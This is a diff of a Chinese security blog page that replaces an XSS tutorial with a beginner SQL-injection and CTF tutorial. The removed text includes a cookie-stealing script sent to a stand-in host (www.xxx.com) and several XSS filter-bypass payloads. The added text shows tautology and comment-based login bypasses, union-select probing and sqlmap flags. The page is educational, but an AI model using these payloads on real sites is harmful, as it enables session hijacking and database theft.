@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="XSS攻击, Hbluewhite的Blog">
+    <meta name="keywords" content="sql注入, Hbluewhite的Blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>XSS攻击 | Hbluewhite的Blog</title>
+    <title>sql注入 | Hbluewhite的Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -356,12 +356,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">XSS攻击</h1>
+                    <h1 class="description center-align post-title">sql注入</h1>
                 </div>
             </div>
         </div>
@@ -493,7 +493,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-08-21
+                    2021-08-22
                 </div>
                 
 
@@ -514,34 +514,52 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h1><h2 id="定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。"><a href="#定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。" class="headerlink" title="定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。"></a>定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。</h2><h2 id="危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。"><a href="#危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。" class="headerlink" title="危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。"></a>危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。</h2><h2 id="原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如与之间的字符是页面的标题等等。当插入’-lt-’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。"><a href="#原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如与之间的字符是页面的标题等等。当插入’-lt-’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。" class="headerlink" title="原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如与之间的字符是页面的标题等等。当插入’&lt;’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。"></a>原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如<title>与</title>之间的字符是页面的标题等等。当插入’&lt;’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。</h2><h3 id="例如：用户通过访问url-http-127-0-0-1-name-abc-就会在浏览器输入如下信息-hello-abc-如果我们传递这样的一个url-http-127-0-0-1-name-60-script-62-alert-39-abc-xss-39-60-script-62-这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url-url-http-127-0-0-1-name-60-script-62-document-location-href-’http-www-xxx-com-cookie-39-document-cookie-60-script-gt-这样类似的代码就会将当前的cookie发送到指定的站点：www-xxx-com"><a href="#例如：用户通过访问url-http-127-0-0-1-name-abc-就会在浏览器输入如下信息-hello-abc-如果我们传递这样的一个url-http-127-0-0-1-name-60-script-62-alert-39-abc-xss-39-60-script-62-这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url-url-http-127-0-0-1-name-60-script-62-document-location-href-’http-www-xxx-com-cookie-39-document-cookie-60-script-gt-这样类似的代码就会将当前的cookie发送到指定的站点：www-xxx-com" class="headerlink" title="例如：用户通过访问url:http://127.0.0.1/?name=abc,就会在浏览器输入如下信息: hello abc,如果我们传递这样的一个url:http://127.0.0.1/?name= &#60; script&#62;alert(&#39;abc,xss&#39;)&#60;/script&#62;这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url: url:http://127.0.0.1/?name= &#60; script&#62;document.location.href=’http://www.xxx.com/cookie?&#39;+document.cookie&#60;/script&gt;,这样类似的代码就会将当前的cookie发送到指定的站点：www.xxx.com/"></a>例如：用户通过访问url:<a target="_blank" rel="noopener" href="http://127.0.0.1/?name=abc,%E5%B0%B1%E4%BC%9A%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BE%93%E5%85%A5%E5%A6%82%E4%B8%8B%E4%BF%A1%E6%81%AF">http://127.0.0.1/?name=abc,就会在浏览器输入如下信息</a>: <strong>hello abc</strong>,如果我们传递这样的一个url:<a target="_blank" rel="noopener" href="http://127.0.0.1/?name=">http://127.0.0.1/?name=</a> &#60; script&#62;alert(&#39;abc,xss&#39;)&#60;/script&#62;这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url: url:<a target="_blank" rel="noopener" href="http://127.0.0.1/?name=">http://127.0.0.1/?name=</a> &#60; script&#62;document.location.href=’<a target="_blank" rel="noopener" href="http://www.xxx.com/cookie?&#39;+document.cookie&#60;/script&gt;,%E8%BF%99%E6%A0%B7%E7%B1%BB%E4%BC%BC%E7%9A%84%E4%BB%A3%E7%A0%81%E5%B0%B1%E4%BC%9A%E5%B0%86%E5%BD%93%E5%89%8D%E7%9A%84cookie%E5%8F%91%E9%80%81%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9A%84%E7%AB%99%E7%82%B9%EF%BC%9Awww.xxx.com/">http://www.xxx.com/cookie?&#39;+document.cookie&#60;/script&gt;,这样类似的代码就会将当前的cookie发送到指定的站点：www.xxx.com/</a></h3><h2 id="类型-从攻击代码的工作方式可以分为三个类型"><a href="#类型-从攻击代码的工作方式可以分为三个类型" class="headerlink" title="类型:从攻击代码的工作方式可以分为三个类型"></a>类型:从攻击代码的工作方式可以分为三个类型</h2><ol>
-<li>持久性跨站：最直接的危害类型，跨站代码存储在服务器中。存储型：主要让用户输入数据。其他用户浏览查看的地方，例如留言、评论、博客、日志等表单。过程：浏览器-后端-浏览器</li>
-<li>非持久性跨站：反射性跨站脚本漏洞，最普遍的类型。用户访问服务器-跨站链接-返回跨站代码。过程：浏览器-后端-数据库-后端-浏览器</li>
-<li>DOM跨站（DOM XSS）：DOM（文档对象模型），客户端脚本处理逻辑导致的安全问题。是指受害者端的页面脚本在修改本地页面DOM环境是未进行合理的处置，而使得攻击脚本被执行。在整个攻击过程中，服务器响应的页面并没有发生变化，引起客户端脚本执行结果的差异的原因是对本地DOM的恶意篡改利用。过程：url-浏览器</li>
-</ol>
-<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>常见的xss的攻击手段和目的：</p>
+                <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p><strong>原理</strong>：所谓sql注入就是通过把sql命令插入到web表单提交或输入域名或页面请求的拆线呢字符串，最终达到欺骗服务器执行指定的sql语句。具体来说，它是利用现有的应用程序，将sql语句注入到后台数据库引擎执行的能力，它可以通过在Web表单上输入sql语句得到一个存在的安全漏洞的网站上的数据，而不是按照设计者意图在执行sql语句</p>
+<p>一、 sql注入漏洞的原理：sql注入攻击指的是通过构建特殊的输入作为参数传入web应用程序，而这些输入大都是sql语法里的一些组合，通过执行sql语句进而执行攻击者所要的操作，其主要原因就是程序根据相关技术原理，sql注入可以分为平台层注入和代码层注入。前者由于不安全的数据库配置或者数据库平台的漏洞所致；后者主要是由于程序员对输入未进行戏指地过滤，从而执行了非法的数据查询。基于此，sql注入的产生原因通常表现在以下几方面：</p>
 <ol>
-<li>盗用cookie,获取敏感信息。</li>
-<li>利用植入Flash,通过crossdomain权限设置进一步获取更高权限，或者利用Java等此类的操作。</li>
-<li>利用iframe、frame、XMLHttpRequest或者上述flash等方式，以用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</li>
-<li>利用可被攻击的域收到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li>
-<li>在访问极大的一些页面上的xss可以攻击游戏额小型的网站，实现DDoS攻击效果</li>
+<li>不合理的查询集处理</li>
+<li>不当的错误处理</li>
+<li>转义字符处理不合适</li>
+<li>多个提交处理不当</li>
 </ol>
-<h2 id="绕过方式："><a href="#绕过方式：" class="headerlink" title="绕过方式："></a>绕过方式：</h2><ol>
-<li>可以用**/**代替空格。</li>
-<li>运用大小写绕过：&lt;imGRC=xonerRo=alert(“xss”)&gt;</li>
-<li><strong>双写关键词</strong>：&lt;imimggsrsrcc=xonerror=alert(“xss”)&gt;</li>
-<li><strong>利用eval字符拼接</strong>：&lt;imgsrc=”x” onerror=”a=alert;b=’(xss);’ ;eval(a+b+c)”&gt;</li>
-<li><strong>利用top</strong>：<script>top<a href="%E2%80%99xss%E2%80%98">"al"+"ert"</a>;</script></li>
-<li>其他字符混淆：可以利用注释、标签的优先级：&lt;<script>alert("xss");//<</script>   2.<title>&lt;img src=</title>&gt;&lt;img src=x onerror=”alert(“xss”);”&gt; 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效 </li>
-<li>编码绕过: Unicode 编码绕过<strong>如果是在html中，我们可以不用应该好。绕过是在js中，我们可以通过反引号代替单双引号</strong>&lt;img src=”C:/Users/86182/Desktop/x” onerror=alert(<code>xss</code>);&gt; 当括号被过滤的时候我们可以使用throw来绕过&lt;svg/onload=”window.onerror=eval;throw’=alert\x281\x29’;”&gt;过滤</li>
+<p>二、sql注入漏洞的方法</p>
+<ol>
+<li>数字注入：</li>
 </ol>
-<h2 id="预防xss"><a href="#预防xss" class="headerlink" title="预防xss"></a>预防xss</h2><ol>
-<li>过滤一些危险的字符，以及转义&amp;&lt;&gt;” ‘ /等危险的字符</li>
-<li>HTTP-only Cookie：禁止JavaScript读取某县敏感的Cookie，攻击者完成XSS后注入后也无法窃取Cookie</li>
-<li>设置CSP(Conrwnr Awxurity Policy)</li>
-<li>输入内容长短限制</li>
+<p>在浏览器地址中输入：?id=1，这是一个get型的接口，发送这个请求相当于调用一个查询语句：</p>
+<p><code>select * from arrticle where id =&quot;$id&quot;</code></p>
+<p>正常情况下，应该返回一个id=1的文章。那么，如果在浏览器地址栏中输入?id=-1or1=1，这就是一个sql注入攻击了，可能会返回所有文章的信息。</p>
+<p>这是因为，id=-1永远为false，而1=1永远是true，根据or语句，那么where的语句的条件想到与没有，那么查询的结果相当于整张表格的内容。</p>
+<p>2.字符串注入</p>
+<p>有这样一个用户登陆的场景:登陆界面包括用户名和密码输入框，以及提交按钮。输入用户名和密码，提交。</p>
+<p>这是一个post的请求，登陆时调用接口learn.me/sql/login.html,首先连接数据库，然后在后台请求用户名和密码参数校验，即是一个sql的查询过程。假设正确的用户名和密码user和pwd123，输入正确的用户名和密码、提交。相当于调用了以下的sql语句。</p>
+<p><code>SELECT *FROM user HERE username =&#39;user&#39; AND password =&#39;pwd123&#39;</code></p>
+<p>由于用户名和密码都是字符串，sql注入方法既是参数携带的数据编程mysql中注释的字符串。mysql中有2种注释的方法</p>
+<ul>
+<li>‘#’：在这之后的所有字符串都会呗当成注释处理，用户名输入user’#密码任意输入，这样提交相当于</li>
+</ul>
+<p><code>SELECT * FROM suer WHERE username=&#39;username&#39;#&#39; AND password=&#39;&#39;</code></p>
+<p>后面相当于注释掉了。</p>
+<ol start="2">
+<li>‘__’后面的字符串也会被当成注释来处理</li>
 </ol>
+<h2 id="当我们遇到sql题目的时候的处理方法"><a href="#当我们遇到sql题目的时候的处理方法" class="headerlink" title="当我们遇到sql题目的时候的处理方法"></a>当我们遇到sql题目的时候的处理方法</h2><ol>
+<li>首先先输入<code>‘ </code>进行判断是否有注入点，也可and 1=1 and 1=2   </li>
+<li>爆破当前的数据库名：通常先用order by使用order by 语法，确定字段数。这个语句的意思是按照第n列排序，若order by 8正常，order by 9报错的话就表示原查询语句查询结果为9列。</li>
+</ol>
+<p><code>union select 1,2,database()#</code></p>
+<ol start="3">
+<li>按照要求爆破出自己需要的</li>
+</ol>
+<p><img src="https://images2018.cnblogs.com/blog/1371400/201804/1371400-20180418233926050-609985087.png" alt="img"></p>
+<p>上面为手动注入，下面可以使用工具，sqlmap</p>
+<p>sqlmap主要是语法之间的使用</p>
+<p>对于文件来说 -r 读取文件 -p 确定参数 –current-db 爆破出当前数据库</p>
+<p>常见的 -u 检测是否有注入点</p>
+<p>-d 数据库</p>
+<p>-t 表</p>
+<p>-c 列</p>
+<p>–dump 爆破数据</p>
 
                 
             </div>
@@ -568,7 +586,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/08/21/XSS%E6%94%BB%E5%87%BB/">http://example.com/2021/08/21/XSS%E6%94%BB%E5%87%BB/</a>
+                    <a href="http://example.com/2021/08/22/sql%E6%B3%A8%E5%85%A5/">http://example.com/2021/08/22/sql%E6%B3%A8%E5%85%A5/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1045,17 +1063,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/08/21/sql%E6%B3%A8%E5%85%A5/">
+                <a href="/2021/08/22/sql%E6%B3%A8%E5%85%A5/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.png" class="responsive-img" alt="sql注入基础">
+                        <img src="/medias/featureimages/8.png" class="responsive-img" alt="sql注入">
                         
-                        <span class="card-title">sql注入基础</span>
+                        <span class="card-title">sql注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1065,9 +1084,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-21
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-22
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1076,6 +1095,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1094,13 +1114,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/08/20/RCE/">
+                <a href="/2021/08/22/RCE/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.png" class="responsive-img" alt="欢迎来到Hbluewhite的博客">
+                        <img src="/medias/featureimages/11.png" class="responsive-img" alt="RCE">
                         
-                        <span class="card-title">欢迎来到Hbluewhite的博客</span>
+                        <span class="card-title">RCE</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1111,7 +1131,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-20
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-22
                             </span>
                         <span class="publish-author">
                             
